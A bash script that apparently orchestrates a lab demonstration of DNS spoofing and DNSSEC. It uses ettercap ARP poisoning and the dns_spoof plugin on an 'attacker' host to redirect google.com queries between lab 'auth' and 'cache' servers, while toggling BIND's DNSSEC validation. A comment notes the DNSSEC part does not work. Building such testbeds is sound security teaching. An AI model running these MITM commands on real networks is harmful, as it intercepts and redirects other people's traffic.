#!/bin/bash

get_mac_ip() {
    client="$1"
    mac=""
    ip=""

    res=$(ssh "$client" "ip --br addr | grep '10.1.2'")

    interface=$(echo $res | awk '{print $1}')
    ip=$(echo $res | awk '{print $3}')

    mac=$(ssh "$client" "ip link show | grep -A 1 $interface | tail -1 | awk '{print \$2}'")

    echo "$mac $ip"
}



ssh client "sudo apt install -y dnsutils traceroute"


# Get MAC and IP from cache
res=$(get_mac_ip cache)
cache_mac=$(echo $res | awk '{print $1}')
cache_ip_mask=$(echo $res | awk '{print $2}')
cache_ip=${cache_ip_mask::-3}


# Get MAC and IP from auth
res=$(get_mac_ip auth)
auth_mac=$(echo $res | awk '{print $1}')
auth_ip_mask=$(echo $res | awk '{print $2}')
auth_ip=${auth_ip_mask::-3}


# Set up dns spoof file
ssh attacker "sudo /bin/bash -c 'echo *.google.com   A 10.1.2.4 >> /etc/ettercap/etter.dns'"
ssh attacker "sudo /bin/bash -c 'echo google.com     A 10.1.2.4 >> /etc/ettercap/etter.dns'"
ssh attacker "sudo /bin/bash -c 'echo www.google.com A 10.1.2.4 >> /etc/ettercap/etter.dns'"


# Set up MITM for arp poisoning and dns spoofing
echo ssh attacker "sudo ettercap -T -S -i eth1 -M arp:remote -P dns_spoof /$auth_ip// /$cache_ip//"
ssh attacker "sudo ettercap -T -S -i eth1 -M arp:remote -P dns_spoof /$auth_ip// /$cache_ip//" >> /dev/null &
etter_pid=$!

sleep 5


cat<<EOF > /tmp/named.conf.options-with-dnssec
options {
        directory "/var/cache/bind";
        forwarders {
                10.1.2.3;
         };

        auth-nxdomain no;    # conform to RFC1035
        listen-on-v6 { any; };
};
EOF
scp /tmp/named.conf.options-with-dnssec cache:/tmp/named.conf.options-with-dnssec
ssh cache "sudo cp /tmp/named.conf.options-with-dnssec /etc/bind/named.conf.options-with-dnssec"


cat<<EOF > /tmp/named.conf.options-no-dnssec
options {
        directory "/var/cache/bind";
        forwarders {
                10.1.2.3;
         };

        auth-nxdomain no;    # conform to RFC1035
        listen-on-v6 { any; };
        dnssec-validation no;
};
EOF
scp /tmp/named.conf.options-no-dnssec cache:/tmp/named.conf.options-no-dnssec
ssh cache "sudo cp /tmp/named.conf.options-no-dnssec /etc/bind/named.conf.options-no-dnssec"


# Set up cache to not use dnssec by default
ssh cache "sudo cp /etc/bind/named.conf.options-no-dnssec /etc/bind/named.conf.options"
ssh cache "sudo systemctl restart named"


# Make a few queries
for el in one two three; do
    ssh client "dig google.com"
done 


# Set up cache to use dnssec by default
# This doesn't work, but its fine. Now its only an arp & dns spoofing example
ssh cache "sudo cp /etc/bind/named.conf.options-with-dnssec /etc/bind/named.conf.options"
ssh cache "sudo systemctl restart named"

sleep 10

# Make a few queries
for el in one two three; do
    ssh client "dig google.com"
done 


sudo kill $etter_pid

sleep 20

